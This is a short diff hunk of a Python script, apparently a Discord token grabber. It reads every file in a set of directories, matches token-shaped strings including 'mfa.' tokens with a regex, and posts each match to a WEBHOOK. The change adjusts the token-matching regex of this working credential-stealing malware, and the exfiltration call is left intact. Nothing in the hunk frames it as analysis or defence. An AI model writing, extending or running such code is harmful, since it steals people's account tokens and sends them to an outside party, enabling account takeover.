@@ -19,7 +19,7 @@ for location in dirs:
     for file in os.listdir(location):
         with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _data:
             try:
-                regex = re.findall(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", _data.read())
+                regex = re.findall(r"N\w+\.\w+\.\w+|mfa\.\w+\-\_?\w+\-\_?\w+", _data.read())
                 if regex:
                     for reg in regex:
                         post(WEBHOOK, reg);
